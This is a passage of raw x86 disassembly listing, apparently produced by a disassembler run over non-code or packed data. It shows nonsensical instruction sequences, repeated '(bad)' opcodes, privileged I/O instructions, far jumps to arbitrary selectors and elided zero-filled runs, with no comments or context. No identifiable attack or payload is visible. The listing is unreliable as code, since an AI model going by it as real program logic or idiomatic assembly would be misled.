  42279e:	and    DWORD PTR ds:0x5a3873ad,ebx
  4227a4:	sub    cl,BYTE PTR [ebx+0x56]
  4227a7:	aas    
  4227a8:	add    ebx,DWORD PTR [edx+ecx*1]
  4227ab:	pop    esi
  4227ac:	jg     0x4227d5
  4227ae:	cs add eax,0x61822054
  4227b4:	push   edi
  4227b5:	gs cmc 
  4227b7:	push   ds
  4227b8:	sbb    ebx,edx
  4227ba:	sub    eax,0xdc6deee8
  4227bf:	leave  
  4227c0:	mov    ds:0xca0fa277,al
  4227c5:	rep outs dx,BYTE PTR ds:[esi]
  4227c7:	sbb    eax,0x2e53cd9e
  4227cc:	test   al,0x40
  4227cf:	add    al,0x90
  4227d1:	jle    0x42283b
  4227d3:	scas   eax,DWORD PTR es:[edi]
  4227d4:	xor    dl,0xed
  4227d7:	out    dx,eax
  4227d8:	(bad)  
  4227d9:	in     al,0xca
  4227db:	fldcw  WORD PTR [edx+esi*2+0x5d]
  4227df:	ss iret 
  4227e1:	add    eax,0xa3aa00ec
  4227e6:	sub    BYTE PTR [edx+edi*4+0x58d1ce3b],bh
  4227ed:	mov    ch,0x5
  4227ef:	pop    edi
  4227f0:	ss pusha 
  4227f2:	fbld   TBYTE PTR ss:[edx]
  4227f5:	clc    
  4227f6:	mov    ah,0xb4
  4227f8:	cld    
  4227f9:	cmp    bl,ah
  4227fb:	mov    ds:0xae4ebded,eax
  422800:	bound  esi,QWORD PTR [ecx-0x32]
  422803:	fdiv   QWORD PTR [ebx+ebx*1-0x77]
  422807:	fisubr WORD PTR [edx-0x21]
  42280a:	aaa    
  42280b:	sti    
  42280c:	push   edx
  42280d:	lea    edx,[eax]
  42280f:	pop    es
  422810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422811:	jns    0x422857
  422813:	push   ebx
  422814:	imul   eax,edi,0x41fec43c
  42281a:	cmp    eax,edi
  42281c:	add    eax,0xa48a5bdc
  422821:	cdq    
  422822:	pop    edi
  422823:	push   0x27074665
  422828:	cmp    DWORD PTR [edx],0x74
  42282b:	dec    edi
  42282c:	in     al,0x8f
  42282e:	dec    ebx
  42282f:	mov    ebx,0x2a603da5
  422834:	pop    ecx
  422835:	lods   eax,DWORD PTR ds:[esi]
  422836:	mov    ch,0xd4
  422838:	call   edx
  42283a:	(bad)  
  42283b:	sar    DWORD PTR [edx],1
  42283d:	leave  
  42283e:	pop    esp
  42283f:	add    dl,bl
  422841:	arpl   WORD PTR [ecx],bp
  422843:	xor    edi,DWORD PTR [esi-0x67b86438]
  422849:	(bad)  
  42284a:	out    dx,eax
  42284b:	add    esi,DWORD PTR [edi+0x30]
  42284e:	scas   al,BYTE PTR es:[edi]
  42284f:	add    al,BYTE PTR [esi]
  422851:	push   ss
  422852:	sbb    al,0x47
  422854:	int3   
  422855:	mov    BYTE PTR [edi-0x3255466d],bh
  42285b:	sub    al,0x33
  42285d:	xor    BYTE PTR [edx+0x124bd97f],dh
  422863:	fstp   st(4)
  422865:	push   ds
  422866:	mov    ss,WORD PTR ds:[ebx]
  422869:	es sub eax,0x182e36f5
  42286f:	pop    edx
  422870:	cmc    
  422871:	mov    esp,esi
  422873:	dec    eax
  422874:	icebp  
  422875:	cvtps2pi mm1,QWORD PTR [edi+ebp*2]
  422879:	mov    dl,0x58
  42287b:	sbb    DWORD PTR [eax+0x4a],eax
  42287e:	jmp    0xf922:0xe8842265
  422885:	stos   BYTE PTR es:[edi],al
  422886:	iret   
  422887:	loopne 0x42284c
  422889:	stos   DWORD PTR es:[edi],eax
  42288a:	sahf   
  42288b:	jae    0x4228d3
  42288d:	call   FWORD PTR [edi]
  42288f:	jo     0x4228bc
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x42293f
  422901:	mov    eax,0x70e87c29
  422906:	add    DWORD PTR [eax],eax
  422908:	add    eax,0x6e000001
  42290d:	mov    ebx,0x45e0cbaf
  422912:	lock pop ebx
  422914:	or     eax,DWORD PTR [ecx+0x5042e5f5]
  42291a:	inc    edx
  42291b:	cdq    
  42291c:	stos   DWORD PTR es:[edi],eax
  42291d:	rcr    BYTE PTR [ebx-0x263d4ea4],cl
  422923:	mov    cl,0xdb
  422925:	icebp  
  422926:	jle    0x42294a
  422928:	mov    cl,0xd
  42292a:	mov    cs,edi
  42292c:	test   al,0xef
  42292e:	dec    ebx
  42292f:	sbb    BYTE PTR [eax],bh
  422931:	(bad)  
  422932:	scas   eax,DWORD PTR es:[edi]
  422933:	aas    
  422934:	push   0x6ef0ab43
  422939:	popf   
  42293a:	scas   al,BYTE PTR es:[edi]
  42293b:	sbb    dh,bh
  42293d:	pushf  
  42293e:	xlat   BYTE PTR ds:[ebx]
  42293f:	div    BYTE PTR [ebp+0x59]
  422942:	mov    edi,0x9f4a7306
  422947:	xor    dh,0x6f
  42294a:	mov    edi,0xb3157d53
  42294f:	(bad)  
  422950:	adc    esi,DWORD PTR [eax+0x6b5f1c0e]
  422956:	adc    al,0x4e
  422958:	call   0x495:0xfb093621
  42295f:	xor    BYTE PTR [eax+0x60],ch
  422962:	jno    0x422911
  422964:	in     al,dx
  422965:	rcr    ebp,1
  422967:	mov    DWORD PTR ds:0x193f6644,0xc0ba3e66
  422972:	xor    ecx,DWORD PTR fs:[eax+0x549b3c71]
  422979:	sub    ebx,DWORD PTR [edx]
  42297b:	daa    
  42297c:	mov    ds,eax
  42297e:	mov    ss,WORD PTR ds:0xb26c3e01
  422984:	loop   0x4229e6
  422986:	stc    
  422987:	ret    0x298b
  42298a:	lods   al,BYTE PTR ds:[esi]
  42298b:	scas   eax,DWORD PTR es:[edi]
  42298c:	popf   
  42298d:	(bad)  
  42298e:	shr    DWORD PTR [edx+0x4c2a7c35],cl
  422994:	mov    eax,ds:0x9bea7dfb
  422999:	mov    edi,0xdef9a4e6
  42299e:	push   esp
  42299f:	into   
  4229a0:	mov    esp,0x2f6d6d6e
  4229a5:	or     eax,0x896b7514
  4229aa:	data16 js 0x4229c1
  4229ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229ae:	aaa    
  4229af:	sti    
  4229b0:	leave  
  4229b1:	retf   
  4229b2:	enter  0xdb55,0xce
  4229b6:	mov    bl,0xa1
  4229b8:	pop    edx
  4229b9:	inc    edx
  4229ba:	cmpxchg dl,dl
  4229bd:	sub    al,0xbb
  4229bf:	ins    BYTE PTR es:[edi],dx
  4229c0:	test   eax,0x1093e014
  4229c5:	xor    al,BYTE PTR [ebx]
  4229c7:	(bad)  
  4229ca:	mov    dl,0xf2
  4229cc:	jle    0x4229d4
  4229ce:	cmp    al,0x82
  4229d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229d1:	sbb    BYTE PTR [eax-0x15e8118e],dh
  4229d7:	pop    ds
  4229d8:	xchg   ebx,eax
  4229d9:	push   esi
  4229da:	sahf   
  4229db:	xchg   ecx,eax
  4229dc:	jbe    0x422a2f
  4229de:	test   eax,0x854beac2
  4229e3:	call   0x4aaf:0x8ca9fa2d
  4229ea:	daa    
  4229eb:	mov    al,ds:0x99dcb098
  4229f0:	sti    
  4229f1:	mov    dh,0xcb
  4229f3:	mov    eax,DWORD PTR [ecx+0x52]
  4229f6:	sar    BYTE PTR [edi+eax*4+0x2b556ba7],cl
  4229fd:	cmc    
  4229fe:	ror    BYTE PTR [ebp+0x57],cl
  422a01:	push   edi
  422a02:	rcr    BYTE PTR cs:[ebp-0x18],0x3f
  422a07:	fld    TBYTE PTR [edx+ebp*8+0x36637481]
  422a0e:	sbb    DWORD PTR [eax],edi
  422a10:	or     DWORD PTR [eax],eax
	...
  422a72:	add    BYTE PTR [eax],al
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	int3   
  422a81:	stos   BYTE PTR es:[edi],al
  422a82:	(bad)  
  422a83:	paddsw mm6,QWORD PTR [ecx+0x1]
  422a87:	add    BYTE PTR ds:0xb5000001,al
  422a8d:	js     0x422a44
  422a8f:	add    edi,ebp
  422a91:	jnp    0x422a5a
  422a93:	inc    ebp
  422a94:	test   BYTE PTR [ebx+ebp*8],0xe1
  422a98:	dec    ecx
  422a99:	stos   DWORD PTR es:[edi],eax
  422a9a:	push   cs
  422a9b:	call   0x46c1b03c
  422aa0:	push   edi
  422aa1:	out    0xca,al
  422aa3:	or     edx,esi
  422aa5:	jle    0x422b0f
  422aa7:	adc    BYTE PTR [ebp+ebx*8-0xc],ch
  422aab:	xchg   esi,eax
  422aac:	outs   dx,DWORD PTR ds:[esi]
  422aad:	mov    ch,0x4a
  422aaf:	ficom  DWORD PTR [edi+0x14469ce1]
  422ab5:	leave  
  422ab6:	popf   
  422ab7:	fs add eax,0xf4fd9e55
  422abd:	sub    al,0xd4
  422abf:	pusha  
  422ac0:	les    ebx,FWORD PTR [edi+eiz*8+0x6f95c62]
  422ac7:	and    ebx,DWORD PTR [edx]
  422ac9:	push   edx
  422aca:	pop    ebx
  422acb:	js     0x422b0e
  422acd:	or     BYTE PTR [eax+edi*2-0x2361d79d],dh
  422ad4:	mul    BYTE PTR [esi-0x3619953e]
  422ada:	cdq    
  422adb:	lea    esp,[eax+eiz*8+0x1f]
  422adf:	mov    edi,0x3da13652
  422ae4:	add    bh,BYTE PTR [edx]
  422ae6:	repz pop ecx
  422ae8:	in     eax,0x99
  422aea:	dec    esi
  422aeb:	mov    dh,0x3a
  422aed:	fcomp  st(6)
  422aef:	jecxz  0x422b19
  422af1:	adc    dh,BYTE PTR [esi+0x45]
  422af4:	sbb    al,BYTE PTR [esp+eiz*2-0x435fdce6]
  422afb:	rcr    eax,1
  422afd:	fs jnp 0x422b6c
  422b00:	(bad)  
  422b01:	push   0x6dd65ad2
  422b06:	clc    
  422b07:	ins    BYTE PTR es:[edi],dx
  422b08:	cmp    BYTE PTR [ecx-0x28],bl
  422b0b:	cwde   
  422b0c:	into   
  422b0d:	in     al,dx
  422b0e:	pop    esi
  422b0f:	mov    esi,0x359533b0
  422b14:	xor    eax,0xb0963698
  422b19:	add    BYTE PTR [eax-0x4c],bl
  422b1c:	cld    
  422b1d:	lods   al,BYTE PTR ds:[esi]
  422b1e:	pop    ds
  422b1f:	mov    esp,0x54e5d8ae
  422b24:	mov    ch,0x3b
  422b26:	dec    ebx
  422b27:	push   ebx
  422b28:	pop    eax
  422b29:	sbb    al,0xe7
  422b2b:	pop    edx
  422b2c:	test   BYTE PTR [edi-0x6f0b9015],bh
  422b32:	fisttp QWORD PTR [edx+0x57]
  422b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b36:	ret    0xa98a
  422b39:	rol    cl,1
  422b3b:	in     al,0xec
  422b3d:	push   es
  422b3e:	clc    
  422b3f:	iret   
  422b40:	lea    esi,[edx-0x16]
  422b43:	pop    ds
  422b44:	rcl    BYTE PTR [ecx],cl
  422b46:	xrelease xchg BYTE PTR [edx+ebp*1-0x1a934408],bl
  422b4e:	ds ins BYTE PTR es:[edi],dx
  422b50:	and    DWORD PTR [ecx-0x6b151972],ebp
  422b56:	std    
  422b57:	dec    ecx
  422b58:	inc    esp
  422b59:	dec    esi
  422b5a:	or     DWORD PTR [edx+0x2a1fd0a9],esi
  422b60:	push   ebp
  422b61:	pop    eax
  422b62:	mov    ebp,0xb3e2912d
  422b67:	push   0x3b0ac8b
  422b6c:	jp     0x422b30
  422b6e:	or     eax,ebx
  422b70:	cmp    DWORD PTR [ebp-0x43],eax
  422b73:	and    ebp,DWORD PTR ds:[ebx+ecx*1+0x19]
  422b78:	add    ebp,ebp
  422b7a:	and    esp,edx
  422b7c:	out    0xb5,al
  422b7e:	sbb    esp,DWORD PTR [ecx+0x37]
  422b81:	test   eax,0xb5cadc55
  422b86:	pop    edx
  422b87:	and    edi,edx
  422b89:	and    edx,DWORD PTR [esi+0x7c1cbf07]
  422b8f:	(bad)  
  422b90:	pusha  
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x4df6b264]
  422c02:	popa   
  422c03:	mov    dl,0xf2
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR ds:0x38000001,al
  422c0d:	sbb    ebx,0xefca7d74
  422c13:	mov    edi,0x4dc8f8bb
  422c18:	xchg   ebx,eax
  422c19:	mov    edi,0x84968782
  422c1e:	jne    0x422c40
  422c20:	xor    al,0xd6
  422c22:	cmp    eax,0xa2449d79
  422c27:	cmp    BYTE PTR [eax+ecx*2],bl
  422c2a:	or     DWORD PTR [esp+esi*8-0x28d002c],eax
  422c31:	dec    esp
  422c32:	pop    ecx
  422c33:	pop    edx
  422c34:	xchg   ebp,eax
  422c35:	stos   BYTE PTR es:[edi],al
  422c36:	pop    ss
  422c37:	jle    0x422bfa
  422c39:	and    al,0x58
  422c3b:	stc    
  422c3c:	shl    DWORD PTR ds:0x13e03104,1
  422c42:	fld    QWORD PTR [esi-0x6845cfa9]
  422c48:	fiadd  WORD PTR [ecx+0x6f]
  422c4b:	xlat   BYTE PTR ds:[ebx]
  422c4c:	mov    BYTE PTR [esi+0x25f5efc1],dh
  422c52:	hlt    
  422c53:	push   ss
  422c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c55:	adc    al,0xec
  422c57:	pop    esp
  422c58:	shr    DWORD PTR [ebp+0x336e1fce],cl
  422c5e:	xchg   edx,eax
  422c5f:	pop    edx
  422c60:	mov    dl,0xf2
  422c62:	test   eax,0x6b2c474d
  422c67:	in     al,0x36
  422c69:	call   0x4d648c68
  422c6e:	pop    es
  422c6f:	mov    gs,WORD PTR [ebx+0x41]
  422c72:	daa    
  422c73:	or     eax,0x752114d4
  422c78:	push   0x58
  422c7a:	ds cmp dh,dh
  422c7d:	and    DWORD PTR [ebp+0x72ceb7d6],esi
  422c83:	push   es
  422c84:	push   0xd7268e59
  422c89:	imul   edi,DWORD PTR [edx],0x7620b95a
  422c8f:	push   ebx
  422c90:	ja     0x422cb0
  422c92:	inc    ecx
  422c93:	xor    al,0x87
  422c95:	mov    WORD PTR [ebp+0x31],cs
  422c98:	push   ebx
  422c99:	cli    
  422c9a:	rcr    BYTE PTR [ebx-0x22],0x4f
  422c9e:	aad    0x75
  422ca0:	fcomp  st(6)
  422ca2:	sub    BYTE PTR ds:0xb641f492,0x64
  422ca9:	out    0x56,al
  422cab:	mov    ds:0x2323a97b,al
  422cb0:	and    eax,0x1014036f
  422cb5:	adc    esi,DWORD PTR [ebp+0x5a8804d5]
  422cbb:	or     edi,DWORD PTR [eax+0x265414a3]
  422cc1:	add    ecx,DWORD PTR [edi-0x1]
  422cc4:	and    BYTE PTR [edi+0x24],ah
  422cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cc8:	sub    al,0xd
  422cca:	out    dx,eax
  422ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ccc:	push   cs
  422ccd:	int3   
  422cce:	cld    
  422ccf:	xchg   ebp,eax
  422cd0:	sub    al,0xdf
  422cd2:	adc    edx,DWORD PTR [edx-0x2f0f17d9]
  422cd8:	or     ebp,0xd0d00c22
  422cde:	push   ecx
  422cdf:	scas   al,BYTE PTR es:[edi]
  422ce0:	ins    DWORD PTR es:[edi],dx
  422ce1:	call   0xc45a832c
  422ce6:	sbb    edi,ebp
  422ce8:	rep ins BYTE PTR es:[edi],dx
  422cea:	add    ch,BYTE PTR [eax]
  422cec:	sbb    eax,0xe1963569
  422cf1:	enter  0x6881,0x99
  422cf5:	add    DWORD PTR [esi+0x7992e598],esp
  422cfb:	cmp    DWORD PTR [esi-0x38],ebp
  422cfe:	push   eax
  422cff:	pop    DWORD PTR [esi]
  422d01:	(bad)  
  422d02:	mov    ebx,?
  422d04:	xchg   dl,ah
  422d06:	std    
  422d07:	push   cs
  422d08:	push   es
  422d09:	ins    DWORD PTR es:[edi],dx
  422d0a:	into   
  422d0b:	jmp    0x48:0x5f1c4ce
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ecx,DWORD PTR [ebp+0x55]
  422d82:	xchg   esp,eax
  422d83:	dec    esp
  422d84:	div    DWORD PTR [ebx+0x1]
  422d87:	add    BYTE PTR ds:0x16000001,al
  422d8d:	adc    DWORD PTR [edx],0x16e5ad24
  422d93:	mov    eax,ds:0x20b7be70
  422d98:	icebp  
  422d99:	scas   al,BYTE PTR es:[edi]
  422d9a:	or     ah,al
  422d9c:	push   es
  422d9d:	ss pop ss
  422d9f:	pop    edi
  422da0:	pop    edx
  422da1:	sahf   
  422da2:	cmpps  xmm7,XMMWORD PTR [esp+ebp*4-0xb],0xc4
  422da8:	push   0xa5161964
  422dad:	jne    0x422d4c
  422daf:	stos   DWORD PTR es:[edi],eax
  422db0:	stos   DWORD PTR es:[edi],eax
  422db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422db2:	jne    0x422e04
  422db4:	sar    DWORD PTR [ebx+0x60],1
  422db7:	push   edi
  422db8:	push   0xbefd353a
  422dbd:	inc    ebx
  422dbe:	pop    ss
  422dbf:	xchg   edi,eax
  422dc0:	adc    ecx,DWORD PTR ds:0x3de081be
  422dc6:	adc    DWORD PTR cs:[edx],ebx
  422dc9:	(bad)  
  422dca:	xchg   DWORD PTR [ecx],ecx
  422dcc:	ror    DWORD PTR [eax],1
  422dce:	pop    ss
  422dcf:	cdq    
  422dd0:	mov    ah,0xb8
  422dd2:	(bad)
  422dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dd6:	ins    DWORD PTR es:[edi],dx
  422dd7:	loopne 0x422de1
  422dd9:	sub    BYTE PTR [edi+0x4788c8fe],al
  422ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422de0:	xor    eax,0xcdd45dc7
  422de5:	mov    ds:0xc77b114c,al
  422dea:	jbe    0x422e25
  422dec:	icebp  
  422ded:	sahf   
  422dee:	ja     0x422df3
  422df0:	(bad)  ds:0x8a38bc
  422df6:	push   esp
  422df7:	mov    al,0xe8
  422df9:	scas   al,BYTE PTR es:[edi]
  422dfa:	pusha  
  422dfb:	(bad)  
  422dfc:	inc    BYTE PTR [ebx+ebp*4-0x507b9f5b]
  422e03:	mov    DWORD PTR [ebp+0x29b0e885],edx
  422e09:	adc    ebx,edx
  422e0b:	xchg   ebp,eax
  422e0c:	inc    ebp
  422e0d:	adc    al,0x10
  422e0f:	mul    esi
  422e11:	mov    esi,0x7038ce2b
  422e16:	pop    ss
  422e17:	adc    bl,dh
  422e19:	push   edx
  422e1a:	rcr    DWORD PTR [edx-0x4be0d97a],0x4
  422e21:	pop    ebx
  422e22:	jne    0x422e04
  422e24:	jp     0x422e27
  422e26:	inc    ebp
  422e27:	pusha  
  422e28:	pop    ecx
  422e29:	rcr    BYTE PTR [edi],1
  422e2b:	sbb    eax,0xdc105905
  422e30:	jb     0x422e75
  422e32:	inc    edi
  422e33:	or     cl,BYTE PTR [ebx]
  422e35:	inc    esi
  422e36:	xchg   esp,eax
  422e37:	(bad)  
  422e38:	clc    
  422e39:	das    
  422e3a:	imul   esi,DWORD PTR [ebx+ecx*4],0x408b17d2
  422e41:	and    BYTE PTR [edx],dh
  422e43:	push   esp
  422e44:	pop    ds
  422e45:	dec    ebx
  422e46:	push   cs
  422e47:	sub    eax,0xdc18236b
  422e4c:	pop    ecx
  422e4d:	aas    
  422e4e:	in     eax,0x94
  422e50:	inc    eax
  422e51:	out    0x15,eax
  422e53:	pop    ss
  422e54:	pop    ecx
  422e55:	sbb    bl,bl
  422e57:	idiv   DWORD PTR [edx-0x34]
  422e5a:	jne    0x422e1c
  422e5c:	dec    ebp
  422e5d:	ret    0x1fc6
  422e60:	adc    eax,0x3a2a0e0f
  422e65:	out    0x53,eax
  422e67:	xor    dh,dl
  422e69:	mov    bh,0x16
  422e6b:	icebp  
  422e6c:	dec    ebp
  422e6d:	popa   
  422e6e:	das    
  422e6f:	mov    edi,DWORD PTR [edx]
  422e71:	inc    esp
  422e72:	ins    DWORD PTR es:[edi],dx
  422e73:	or     al,0x9f
  422e75:	cmp    dh,bh
  422e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e78:	mov    eax,ds:0x18910858
  422e7d:	mov    esi,0xe2ef4089
  422e82:	int3   
  422e83:	pop    ss
  422e84:	or     al,0x4d
  422e86:	ss mov dh,0xe2
  422e89:	xor    eax,0x4779acd1
  422e8e:	cmp    ecx,DWORD PTR [ebp+ebx*8+0x0]
	...
  422ef2:	add    BYTE PTR [eax],al
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x1712ca33
  422f02:	shl    edx,cl
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0xeb000001,al
  422f0d:	mov    dh,0xee
  422f0f:	push   0x1a
  422f11:	sbb    dh,0x65
  422f14:	mov    ebx,0xc1c8213e
  422f19:	mov    dh,BYTE PTR [ebx]
  422f1b:	push   esi
  422f1c:	push   ss
  422f1d:	push   ss
  422f1e:	inc    ebp
  422f1f:	pop    ss
  422f20:	xor    eax,0x6953c394
  422f25:	dec    ebp
  422f26:	and    cl,BYTE PTR [esi+0x73914233]
  422f2c:	shl    BYTE PTR [esi+0x84c295b],cl
  422f32:	mov    dl,BYTE PTR [ebx-0x54]
  422f35:	xor    bl,BYTE PTR [ecx]
  422f37:	into   
  422f38:	icebp  
  422f39:	add    cl,BYTE PTR [ebx+0x74]
  422f3c:	or     edx,0x35
  422f3f:	adc    ebp,DWORD PTR [ebp-0x79efd53b]
  422f45:	sub    DWORD PTR [ecx+0x1f],edi
  422f48:	mov    esp,0x2b53d59f
  422f4d:	adc    BYTE PTR [ebp+0x67],0x26
  422f51:	cdq    
  422f52:	hlt    
  422f53:	leave  
  422f54:	adc    BYTE PTR gs:[ebx+0x4d],0x93
  422f59:	mov    ch,bh
  422f5b:	pop    edx
  422f5c:	pop    es
  422f5d:	add    al,0xd8
  422f5f:	bound  eax,QWORD PTR [ebp+edx*1-0x55]
  422f63:	inc    edx
  422f64:	adc    DWORD PTR [ebx+0x7e],esp
  422f67:	ret    0x8014
  422f6a:	imul   DWORD PTR [ebp+ecx*8+0x41]
  422f6e:	inc    ebp
  422f6f:	pop    eax
  422f70:	hlt    
  422f71:	sbb    al,BYTE PTR [esi+0x64]
  422f74:	xchg   edi,eax
  422f75:	jle    0x422f80
  422f77:	dec    ebp
  422f78:	mov    esp,DWORD PTR [edx]
  422f7a:	(bad)  ss:[eax+0x23f53417]
  422f81:	inc    ebx
  422f82:	popa   
  422f83:	pop    ebp
  422f84:	cli    
  422f85:	push   cs
  422f86:	jle    0x422f3c
  422f88:	sbb    eax,ebx
  422f8a:	mov    BYTE PTR [edi],0xa
  422f8d:	mov    fs,WORD PTR [edx-0xb]
  422f90:	idiv   DWORD PTR ds:0x25c54859
  422f96:	push   esi
  422f97:	test   DWORD PTR [ecx+0x514e7c37],eax
  422f9d:	jl     0x42301a
  422f9f:	imul   ecx,DWORD PTR [eax],0xffffff96
  422fa2:	push   esp
  422fa3:	pop    ebp
  422fa4:	retfw  0x29de
  422fa8:	add    al,0xaa
  422faa:	popf   
  422fab:	or     al,BYTE PTR [edi+0x461c2d6d]
  422fb1:	pusha  
  422fb2:	hlt    
  422fb3:	inc    ecx
  422fb4:	fld    DWORD PTR [ecx-0x28a06d34]
  422fba:	add    esi,DWORD PTR [ebp*1-0x6fe89e39]
  422fc1:	retf   
  422fc2:	mov    al,0x5f
  422fc4:	imul   ecx,esp,0x6a
  422fc7:	loop   0x422fd0
  422fc9:	loopne 0x422f9d
  422fcb:	gs jb  0x422fe5
  422fce:	xor    ch,BYTE PTR [esi+0x7c]
  422fd1:	push   0x91ec870
  422fd6:	inc    ecx
  422fd7:	cmp    DWORD PTR [edx+0x4a],edi
  422fda:	(bad)  
  422fdb:	enter  0x4ac9,0x3b
  422fdf:	mov    ecx,DWORD PTR cs:[edx]
  422fe2:	and    DWORD PTR [edi-0x66f6e762],0x48f23fd8
  422fec:	ret    0x741a
  422fef:	out    dx,eax
  422ff0:	outs   dx,BYTE PTR ds:[esi]
  422ff1:	nop
  422ff2:	call   0x183e:0xd655ed7e
  422ff9:	repnz xchg ecx,eax
  422ffb:	test   eax,0x93c754b5
  423000:	mov    bh,0xf5
  423002:	out    0xed,al
  423004:	fs dec ebp
  423006:	(bad)  
  423008:	mov    BYTE PTR [esi+0x59],dh
  42300b:	dec    edx
  42300c:	shl    BYTE PTR [ecx+0x31],cl
  42300f:	aas    
  423010:	mov    DWORD PTR [eax],eax
	...
  423072:	add    BYTE PTR [eax],al
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebx+esi*4+0x1970a2b],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0xa2000001,al
  42308d:	inc    ebp
  42308e:	scas   eax,DWORD PTR es:[edi]
  42308f:	mov    esi,0x9a129817
  423094:	dec    esi
  423095:	dec    esp
  423096:	fcom   QWORD PTR [ecx-0x3]
  423099:	jle    0x423100
  42309b:	leave  
  42309c:	outs   dx,BYTE PTR ds:[esi]
  42309d:	out    dx,eax
  42309e:	jg     0x4230f3
  4230a0:	lock retf 
  4230a2:	jo     0x42309f
  4230a4:	xor    DWORD PTR [ebp-0x1fda52f0],0x4a494359
  4230ae:	stos   BYTE PTR es:[edi],al
  4230af:	rcr    DWORD PTR [eax],cl
  4230b1:	neg    BYTE PTR [ecx+0x10]
  4230b4:	retf   0xefff
  4230b7:	jge    0x423046
  4230b9:	bswap  esi
  4230bb:	retf   0x398c
  4230be:	adc    ah,bh
  4230c0:	int3   
  4230c1:	or     eax,0x45d100e8
  4230c6:	cmp    bl,0x5a
  4230c9:	xchg   ebp,eax
  4230ca:	test   DWORD PTR [esi],esp
  4230cc:	imul   edx,DWORD PTR [esi],0x19
  4230cf:	jle    0x42311c
  4230d1:	std    
  4230d2:	scas   eax,DWORD PTR es:[edi]
  4230d3:	xor    eax,0x38f6c4c1
  4230d8:	in     al,0x76
  4230da:	test   BYTE PTR [edx],dl
  4230dc:	jp     0x4230ad
  4230de:	xchg   esp,eax
  4230df:	test   eax,0x1b4cf419
  4230e4:	stos   BYTE PTR es:[edi],al
  4230e5:	sahf   
  4230e6:	cs xchg edx,eax
  4230e8:	xor    BYTE PTR [edi],bl
  4230ea:	dec    esi
  4230eb:	fsub   QWORD PTR [ecx]
  4230ed:	ret    
  4230ee:	dec    ebp
  4230ef:	xor    bh,bl
  4230f1:	gs xchg ebp,eax
  4230f3:	or     eax,0xc592a53b
  4230f8:	ret    
  4230f9:	or     dh,ch
  4230fb:	xor    BYTE PTR [ecx+0x62ff6343],0x86
  423102:	ret    0x2c8e
  423105:	loopne 0x4230f2
  423107:	popa   
  423108:	pop    ebp
  423109:	sub    ch,BYTE PTR [ecx]
  42310b:	jo     0x423163
  42310d:	fsubr  QWORD PTR [edx-0x600aa296]
  423113:	loop   0x423134
  423115:	leave  
  423116:	outs   dx,DWORD PTR ds:[esi]
  423118:	mov    ah,0x6f
  42311a:	std    
  42311b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42311c:	loop   0x4230d4
  42311e:	les    edi,FWORD PTR [ecx]
  423120:	jp     0x423197
  423122:	out    0xd,eax
  423124:	xor    al,0x26
  423126:	pushf  
  423127:	or     eax,0xb7ab8b25
  42312c:	xchg   edx,eax
  42312d:	js     0x42315a
  42312f:	sub    ebx,DWORD PTR [edi+0x90cafe3]
  423135:	push   ds
  423136:	pop    esi
  423137:	push   ecx
  423138:	shr    BYTE PTR [ecx],1
  42313a:	daa    
  42313b:	fcmovu st,st(4)
  42313d:	ins    DWORD PTR es:[edi],dx
  42313e:	push   eax
  42313f:	jecxz  0x423187
  423141:	pop    esi
  423142:	sbb    al,0xd1
  423144:	dec    ecx
  423145:	and    bl,BYTE PTR [edi+0x154a4c7b]
  42314b:	(bad)  
  42314c:	stos   BYTE PTR es:[edi],al
  42314d:	inc    ecx
  42314e:	push   edi
  42314f:	push   edi
  423150:	sbb    ecx,DWORD PTR [ebp+0x6db2cc3c]
  423156:	pop    eax
  423157:	sub    BYTE PTR [edi+esi*4],ah
  42315a:	ret    
  42315b:	mov    ch,0x3e
  42315d:	inc    ebp
  42315e:	neg    BYTE PTR [ecx+0x4654589a]
  423164:	mov    bh,0x22
  423166:	fprem1 
  423168:	pop    edi
  423169:	and    eax,0x847f47f1
  42316e:	loope  0x423138
  423170:	iret   
  423171:	jae    0x423116
  423173:	int3   
  423174:	int3   
  423175:	rcl    DWORD PTR ds:0x8e65d14f,0x8d
  42317c:	in     al,dx
  42317d:	out    dx,eax
  42317e:	stos   BYTE PTR es:[edi],al
  42317f:	lods   al,BYTE PTR ds:[esi]
  423180:	mov    ch,0x67
  423182:	xchg   ebp,eax
  423183:	jae    0x423175
  423185:	ja     0x423141
  423187:	ficomp DWORD PTR [eax+0x365ca463]
